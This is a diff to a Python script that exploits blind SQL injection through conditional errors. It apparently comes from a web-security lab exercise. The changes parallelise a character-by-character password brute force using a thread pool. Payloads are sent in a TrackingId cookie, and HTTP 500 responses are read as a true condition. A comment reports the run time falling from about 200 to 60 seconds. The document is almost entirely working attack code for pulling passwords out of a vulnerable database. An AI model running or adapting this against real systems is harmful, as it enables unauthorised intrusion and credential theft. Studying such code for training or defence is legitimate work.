@@ -1,7 +1,8 @@
 import string
 import timeit
-
 import requests
+from concurrent import futures
+from concurrent.futures import as_completed
 import backoff
 
 """ Exploiting blind SQL injection by triggering conditional errors
@@ -53,10 +54,25 @@ def bruteforce_password(candidates):
 
 
 def bruteforce_password_character(candidates, pos):
-    for candidate in candidates:
-        if try_candidate(pos, candidate):
-            return candidate
-    else:
+    with futures.ThreadPoolExecutor(max_workers=5) as executor:
+        futures_dict = dict()
+
+        for candidate in candidates:
+            futures_dict[candidate] = executor.submit(try_candidate, pos, candidate)
+            futures_dict[candidate].candidate = candidate  # adds custom property to the future for later reference
+
+        for completed in as_completed(futures_dict.values()):
+            res: requests.Response = completed.result()
+
+            if res.status_code == 504:
+                raise Exception("Server returned 504")
+            if res.status_code != 500:
+                print(".", end="")
+
+            if res.status_code == 500:
+                executor.shutdown(wait=False, cancel_futures=True)
+                return completed.candidate
+
         print(f" tried all candidates for position {pos}")
         return False
 
@@ -77,15 +93,7 @@ def try_candidate(pos, candidate):
 
     cookies = {"session": "whatever", "TrackingId": payload}
 
-    with requests.get(url, cookies=cookies, timeout=3) as res:
-        if res.status_code == 504:
-            raise Exception("Server returned 504")
-
-        if res.status_code != 500:
-            print(".", end="")
-            return False
-
-        return True
+    return requests.get(url, cookies=cookies, timeout=3)
 
 
 def get_candidates_alphanumeric():
@@ -102,4 +110,5 @@ def main():
 
 if __name__ == '__main__':
     time_elapsed = timeit.timeit(main, number=1)
-    print(f"Execution took {time_elapsed} seconds.")  # about 200 seconds
+    print(f"Execution took {time_elapsed} seconds.")  # about 60 seconds with 5 workers
+    # overall time can be reduced to about 40 seconds with max worker threads
